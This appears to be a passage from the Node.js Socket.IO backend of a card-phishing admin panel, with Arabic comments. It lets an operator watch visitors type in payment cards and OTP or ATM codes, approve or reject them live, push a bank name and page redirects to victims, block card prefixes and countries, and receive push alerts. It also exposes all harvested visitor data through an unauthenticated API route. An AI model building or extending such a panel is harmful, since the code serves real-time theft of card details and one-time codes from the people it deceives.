    // حفظ الرمز في بيانات الزائر وتحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.lastSentCode = code;
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Code sent to visitor ${visitorSocketId}: ${code}`);
  });

  // Admin: Navigate visitor to page
  socket.on("admin:navigate", ({ visitorSocketId, page }) => {
    io.to(visitorSocketId).emit("visitor:navigate", page);
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Navigating visitor ${visitorSocketId} to: ${page}`);
  });

  // Admin: Card action (OTP, ATM, Reject)
  socket.on("admin:cardAction", ({ visitorSocketId, action }) => {
    io.to(visitorSocketId).emit("card:action", action);
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      // If admin rejected the card, add last card number to rejectedCards list
      if (action === 'reject' && visitor.paymentCards && visitor.paymentCards.length > 0) {
        if (!visitor.rejectedCards) visitor.rejectedCards = [];
        const lastCard = visitor.paymentCards[visitor.paymentCards.length - 1];
        if (lastCard && lastCard.cardNumber && !visitor.rejectedCards.includes(lastCard.cardNumber)) {
          visitor.rejectedCards.push(lastCard.cardNumber);
        }
      }
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Card action ${action} sent to visitor ${visitorSocketId}`);
  });

  // Admin: Code action (Approve, Reject) for OTP/digit codes
  socket.on("admin:codeAction", ({ visitorSocketId, action, codeIndex }) => {
    io.to(visitorSocketId).emit("code:action", { action, codeIndex });
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Code action ${action} sent to visitor ${visitorSocketId}`);
  });

  // Admin: Approve resend code request
  socket.on("admin:approveResend", ({ visitorSocketId }) => {
    io.to(visitorSocketId).emit("resend:approved");
    // تحديث حالة الانتظار
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.waitingForAdminResponse = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.emit("visitors:update", Array.from(visitors.values()));
    }
    console.log(`Resend approved for visitor ${visitorSocketId}`);
  });

  // Admin: Block visitor
  socket.on("admin:block", ({ visitorSocketId }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.isBlocked = true;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.to(visitorSocketId).emit("blocked");
      console.log(`Visitor blocked: ${visitorSocketId}`);
    }
  });

  // Admin: Unblock visitor
  socket.on("admin:unblock", ({ visitorSocketId }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.isBlocked = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      io.to(visitorSocketId).emit("unblocked");
      console.log(`Visitor unblocked: ${visitorSocketId}`);
    }
  });

  // Admin: Delete visitor by socket ID
  socket.on("admin:delete", (visitorSocketId) => {
    io.to(visitorSocketId).emit("deleted");
    visitors.delete(visitorSocketId);
    
    // Also remove from saved visitors
    const visitorToDelete = Array.from(visitors.values()).find(v => v.socketId === visitorSocketId);
    if (visitorToDelete) {
      savedVisitors = savedVisitors.filter(v => v._id !== visitorToDelete._id);
      saveData();
    }
    
    console.log(`Visitor deleted: ${visitorSocketId}`);
  });

  // Admin: Delete visitor by ID
  socket.on("admin:deleteById", (visitorId) => {
    // Find and remove from active visitors
    visitors.forEach((v, socketId) => {
      if (v._id === visitorId) {
        io.to(socketId).emit("deleted");
        visitors.delete(socketId);
      }
    });
    
    // Remove from saved visitors
    savedVisitors = savedVisitors.filter(v => v._id !== visitorId);
    saveData();
    
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("visitor:deleted", { visitorId });
    });
    
    console.log(`Visitor deleted by ID: ${visitorId}`);
  });

  // Admin: Send last message
  socket.on("admin:sendMessage", ({ visitorSocketId, message }) => {
    io.to(visitorSocketId).emit("admin-last-message", { message });
    console.log(`Message sent to visitor ${visitorSocketId}: ${message}`);
  });

  // Admin: Set bank name
  socket.on("admin:setBankName", ({ visitorSocketId, bankName }) => {
    io.to(visitorSocketId).emit("bankName", bankName);
    console.log(`Bank name set for visitor ${visitorSocketId}: ${bankName}`);
  });

  // Admin: Change password
  socket.on("admin:changePassword", ({ oldPassword, newPassword }) => {
    // Verify old password - uses persistent password from disk
    if (oldPassword === adminPassword) {
      // Update password and save to disk for persistence
      adminPassword = newPassword;
      saveData();
      socket.emit("admin:passwordChanged", true);
      console.log("Admin password changed successfully and saved to disk");
      
      // Force logout ALL other admin sessions
      admins.forEach((admin, adminSocketId) => {
        if (adminSocketId !== socket.id) {
          io.to(adminSocketId).emit("admin:forceLogout");
          admins.delete(adminSocketId);
          console.log(`Force logged out admin: ${adminSocketId}`);
        }
      });
      
      // Force logout the password changer too after a delay
      setTimeout(() => {
        io.to(socket.id).emit("admin:forceLogout");
        admins.delete(socket.id);
        console.log(`Force logged out password changer: ${socket.id}`);
      }, 2000);
      
      console.log("All admin sessions logged out after password change");
    } else {
      socket.emit("admin:passwordChanged", false);
      console.log("Admin password change failed - wrong old password");
    }
  });

  // Admin: Clear all data
  socket.on("admin:clearAllData", () => {
    // Disconnect all visitors
    visitors.forEach((v, socketId) => {
      io.to(socketId).emit("deleted");
    });
    
    // Clear all data
    visitors.clear();
    savedVisitors = [];
    visitorCounter = 0;
    
    // Save empty data to disk
    saveData();
    
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("allDataCleared");
    });
    
    console.log("All data cleared by admin");
  });

  // WhatsApp: Get current number
  socket.on("whatsapp:get", () => {
    // Send to admin
    socket.emit("whatsapp:current", whatsappNumber);
    // Also send to client (for footer)
    socket.emit("whatsapp:update", whatsappNumber);
  });

  // WhatsApp: Set number (admin only)
  socket.on("whatsapp:set", (number) => {
    whatsappNumber = number;
    saveData();
    // Broadcast to all connected clients
    io.emit("whatsapp:update", whatsappNumber);
    console.log(`WhatsApp number updated: ${whatsappNumber}`);
  });

  // Blocked Cards: Get list
  socket.on("blockedCards:get", () => {
    socket.emit("blockedCards:list", globalBlockedCards);
  });

  // Blocked Cards: Add prefix
  socket.on("blockedCards:add", (prefix) => {
    if (prefix && prefix.length === 4 && !globalBlockedCards.includes(prefix)) {
      globalBlockedCards.push(prefix);
      saveData();
      // Notify all admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("blockedCards:list", globalBlockedCards);
      });
      // Broadcast to all clients
      io.emit("blockedCards:updated", globalBlockedCards);
      console.log(`Blocked card prefix added: ${prefix}`);
    }
  });

  // Blocked Cards: Remove prefix
  socket.on("blockedCards:remove", (prefix) => {
    globalBlockedCards = globalBlockedCards.filter(p => p !== prefix);
    saveData();
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("blockedCards:list", globalBlockedCards);
    });
    // Broadcast to all clients
    io.emit("blockedCards:updated", globalBlockedCards);
    console.log(`Blocked card prefix removed: ${prefix}`);
  });

  // Blocked Cards: Check if card is blocked (for clients)
  socket.on("blockedCards:check", (cardNumber) => {
    const prefix = cardNumber.replace(/\s/g, '').substring(0, 4);
    const isBlocked = globalBlockedCards.includes(prefix);
    socket.emit("blockedCards:checkResult", { isBlocked, prefix });
  });

  // Blocked Countries: Get list
  socket.on("blockedCountries:get", () => {
    socket.emit("blockedCountries:list", globalBlockedCountries);
  });

  // Blocked Countries: Add country
  socket.on("blockedCountries:add", (country) => {
    if (country && !globalBlockedCountries.includes(country)) {
      globalBlockedCountries.push(country);
      saveData();
      // Notify all admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("blockedCountries:list", globalBlockedCountries);
      });
      // Broadcast to all clients
      io.emit("blockedCountries:updated", globalBlockedCountries);
      console.log(`Blocked country added: ${country}`);
    }
  });

  // Blocked Countries: Remove country
  socket.on("blockedCountries:remove", (country) => {
    globalBlockedCountries = globalBlockedCountries.filter(c => c !== country);
    saveData();
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("blockedCountries:list", globalBlockedCountries);
    });
    // Broadcast to all clients
    io.emit("blockedCountries:updated", globalBlockedCountries);
    console.log(`Blocked country removed: ${country}`);
  });

  // Blocked Countries: Check if visitor's country is blocked
  socket.on("blockedCountries:check", (country) => {
    const isBlocked = globalBlockedCountries.some(c => 
      c.toLowerCase() === country.toLowerCase()
    );
    socket.emit("blockedCountries:checkResult", { isBlocked, country });
  });

  // Allowed Domains: Get list
  socket.on("allowedDomains:get", () => {
    socket.emit("allowedDomains:list", allowedDomains);
  });

  // Allowed Domains: Add domain
  socket.on("allowedDomains:add", (domain) => {
    if (domain && !allowedDomains.includes(domain)) {
      // Clean domain - remove https://, www., trailing slashes
      let cleanDomain = domain.replace(/^https?:\/\//, '').replace(/^www\./, '').replace(/\/+$/, '').toLowerCase();
      if (cleanDomain && !allowedDomains.includes(cleanDomain)) {
        allowedDomains.push(cleanDomain);
        saveData();
        // Notify all admins
        admins.forEach((admin, adminSocketId) => {
          io.to(adminSocketId).emit("allowedDomains:list", allowedDomains);
        });
        console.log(`Allowed domain added: ${cleanDomain}`);
      }
    }
  });

  // Allowed Domains: Remove domain
  socket.on("allowedDomains:remove", (domain) => {
    allowedDomains = allowedDomains.filter(d => d !== domain);
    saveData();
    // Notify all admins
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("allowedDomains:list", allowedDomains);
    });
    console.log(`Allowed domain removed: ${domain}`);
  });

  // Admin: Mark visitor data as read (hide new data indicator)
  socket.on("admin:markAsRead", (visitorId) => {
    // Find visitor by ID in active visitors
    let found = false;
    visitors.forEach((v, socketId) => {
      if (v._id === visitorId) {
        v.hasNewData = false;
        visitors.set(socketId, v);
        saveVisitorPermanently(v);
        found = true;
      }
    });
    
    // Also update in saved visitors
    const savedVisitor = savedVisitors.find(v => v._id === visitorId);
    if (savedVisitor) {
      savedVisitor.hasNewData = false;
      saveData();
    }
    
    // Notify all admins about the update
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("visitor:markedAsRead", { visitorId });
    });
    
    console.log(`Visitor ${visitorId} marked as read`);
  });

  // Admin: Toggle star on visitor
  socket.on("admin:toggleStar", (visitorId) => {
    // Find visitor by ID in active visitors
    visitors.forEach((v, socketId) => {
      if (v._id === visitorId) {
        v.isStarred = !v.isStarred;
        visitors.set(socketId, v);
        saveVisitorPermanently(v);
      }
    });
    
    // Also update in saved visitors
    const savedVisitor = savedVisitors.find(v => v._id === visitorId);
    if (savedVisitor) {
      savedVisitor.isStarred = !savedVisitor.isStarred;
      saveData();
    }
    
    // Notify all admins about the update
    admins.forEach((admin, adminSocketId) => {
      io.to(adminSocketId).emit("visitor:starToggled", { visitorId, isStarred: savedVisitor ? savedVisitor.isStarred : false });
    });
  });

  // Chat: Message from visitor to admin
  socket.on("chat:fromVisitor", ({ visitorSocketId, message, timestamp }) => {
    const visitor = visitors.get(visitorSocketId) || visitors.get(socket.id);
    if (visitor) {
      // Initialize chat messages array if not exists
      if (!visitor.chatMessages) {
        visitor.chatMessages = [];
      }
      
      // Add message to visitor's chat history
      const chatMessage = {
        id: Date.now().toString(),
        text: message,
        sender: 'visitor',
        timestamp: timestamp || new Date().toISOString()
      };
      visitor.chatMessages.push(chatMessage);
      visitor.hasNewMessage = true;
      visitors.set(visitor.socketId, visitor);
      saveVisitorPermanently(visitor);
      
      // Notify all admins about the new message
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("chat:newMessage", {
          visitorSocketId: visitor.socketId,
          visitorId: visitor._id,
          message: chatMessage
        });
      });
      
      console.log(`Chat message from visitor ${visitor.socketId}: ${message}`);
    }
  });

  // Chat: Message from admin to visitor
  socket.on("chat:fromAdmin", ({ visitorSocketId, message, timestamp }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      // Initialize chat messages array if not exists
      if (!visitor.chatMessages) {
        visitor.chatMessages = [];
      }
      
      // Add message to visitor's chat history
      const chatMessage = {
        id: Date.now().toString(),
        text: message,
        sender: 'admin',
        timestamp: timestamp || new Date().toISOString()
      };
      visitor.chatMessages.push(chatMessage);
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
      
      // Send message to visitor
      io.to(visitorSocketId).emit("chat:fromAdmin", {
        message: message,
        timestamp: chatMessage.timestamp
      });
      
      console.log(`Chat message from admin to visitor ${visitorSocketId}: ${message}`);
    }
  });

  // Chat: Mark messages as read
  socket.on("chat:markAsRead", ({ visitorSocketId }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      visitor.hasNewMessage = false;
      visitors.set(visitorSocketId, visitor);
      saveVisitorPermanently(visitor);
    }
  });

  // Admin: Block card prefix
  socket.on("admin:blockCardPrefix", ({ visitorSocketId, prefix }) => {
    const visitor = visitors.get(visitorSocketId);
    if (visitor) {
      if (!visitor.blockedCardPrefixes.includes(prefix)) {
        visitor.blockedCardPrefixes.push(prefix);
        visitors.set(visitorSocketId, visitor);
        saveVisitorPermanently(visitor);
      }
      console.log(`Card prefix blocked for visitor ${visitorSocketId}: ${prefix}`);
    }
  });

  // Handle disconnection
  socket.on("disconnect", () => {
    // Check if it's a visitor
    if (visitors.has(socket.id)) {
      const visitor = visitors.get(socket.id);
      const visitorId = visitor._id;
      const socketId = socket.id;
      
      // Don't delete visitor data - keep it permanently
      visitors.delete(socket.id);
      
      // Delay disconnect notification to allow for quick reconnection
      setTimeout(() => {
        // Check if visitor reconnected with same ID
        const reconnected = Array.from(visitors.values()).some(v => v._id === visitorId && v.isConnected);
        
        if (!reconnected) {
          // Update saved visitor as disconnected
          const savedVisitor = savedVisitors.find(v => v._id === visitorId);
          if (savedVisitor) {
            savedVisitor.isConnected = false;
            saveData();
          }
          
          // Notify admins
          admins.forEach((admin, adminSocketId) => {
            io.to(adminSocketId).emit("visitor:disconnected", {
              visitorId: visitorId,
              socketId: socketId,
            });
          });
          
          console.log(`Visitor disconnected: ${socketId}`);
        } else {
          console.log(`Visitor ${visitorId} reconnected quickly, skipping disconnect notification`);
        }
      }, 1000); // 1 second delay
    }

    // Check if it's an admin
    if (admins.has(socket.id)) {
      admins.delete(socket.id);

      // Notify visitors if no admins left
      if (admins.size === 0) {
        visitors.forEach((visitor, visitorSocketId) => {
          io.to(visitorSocketId).emit("isAdminConnected", false);
        });
      }

      console.log(`Admin disconnected: ${socket.id}`);
    }
  });
});

// REST API Routes
app.get("/", (req, res) => {
  res.json({ status: "Server is running", timestamp: new Date().toISOString() });
});

app.get("/api/visitors", (req, res) => {
  res.json(savedVisitors);
});

app.get("/api/stats", (req, res) => {
  res.json({
    totalVisitors: savedVisitors.length,
    connectedVisitors: visitors.size,
    totalAdmins: admins.size,
    visitorCounter,
  });
});

// FCM Token Registration
app.post("/api/fcm/register", (req, res) => {
  const { token } = req.body;
  if (!token) return res.status(400).json({ error: 'Token required' });
  
  // Add token if not already registered
  if (!fcmTokens.includes(token)) {
    fcmTokens.push(token);
    saveFcmTokens();
    console.log(`FCM token registered: ${token.substring(0, 20)}... (total: ${fcmTokens.length})`);
  }
  res.json({ success: true, message: 'Token registered' });
});

// FCM Token Unregister
app.post("/api/fcm/unregister", (req, res) => {
  const { token } = req.body;
  if (!token) return res.status(400).json({ error: 'Token required' });
  
  fcmTokens = fcmTokens.filter(t => t !== token);
  saveFcmTokens();
  console.log(`FCM token unregistered: ${token.substring(0, 20)}...`);
  res.json({ success: true, message: 'Token unregistered' });
});

// Test push notification
app.get("/api/fcm/test", async (req, res) => {
  try {
    await sendPushNotification('اختبار الإشعارات', 'هذا إشعار تجريبي من لوحة التحكم');
    res.json({ success: true, message: `Test notification sent to ${fcmTokens.length} devices` });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// FCM Status - debug endpoint
app.get("/api/fcm/status", (req, res) => {
  res.json({
    firebaseInitialized: !!firebaseAdmin,
    tokenCount: fcmTokens.length,
    tokens: fcmTokens.map(t => t.substring(0, 30) + '...')
  });
});

// Idle check timer - every 10 seconds, check for visitors idle > 30 seconds
setInterval(() => {
  const now = Date.now();
  visitors.forEach((visitor, sid) => {
    const wasIdle = visitor.isIdle || false;
    const isNowIdle = visitor.lastActivity ? (now - visitor.lastActivity) > 60000 : false;
    if (isNowIdle !== wasIdle) {
      visitor.isIdle = isNowIdle;
      visitors.set(sid, visitor);
      // Notify admins about idle status change
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:idleChanged", {
          visitorId: visitor._id,
          isIdle: isNowIdle,
        });
      });
    }
  });
}, 10000);

// Cleanup stale/dead socket connections every 30 seconds
// This prevents ghost visitors from accumulating in the active visitors Map
setInterval(() => {
  let cleaned = 0;
  visitors.forEach((visitor, sid) => {
    // Check if the socket is still actually connected
    const socket = io.sockets.sockets.get(sid);
    if (!socket || !socket.connected) {
      // Socket is dead/disconnected but still in the Map - remove it
      const visitorId = visitor._id;
      visitors.delete(sid);
      cleaned++;
      
      // Update saved visitor as disconnected
      const savedVisitor = savedVisitors.find(v => v._id === visitorId);
      if (savedVisitor) {
        savedVisitor.isConnected = false;
        saveData();
      }
      
      // Notify admins
      admins.forEach((admin, adminSocketId) => {
        io.to(adminSocketId).emit("visitor:disconnected", {
          visitorId: visitorId,
          socketId: sid,
        });
      });
    }
  });
  if (cleaned > 0) {
    console.log(`Cleaned ${cleaned} stale socket connections. Active visitors: ${visitors.size}`);
  }
}, 30000);

// Start server
const PORT = process.env.PORT || 3001;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Loaded ${savedVisitors.length} saved visitors`);
});
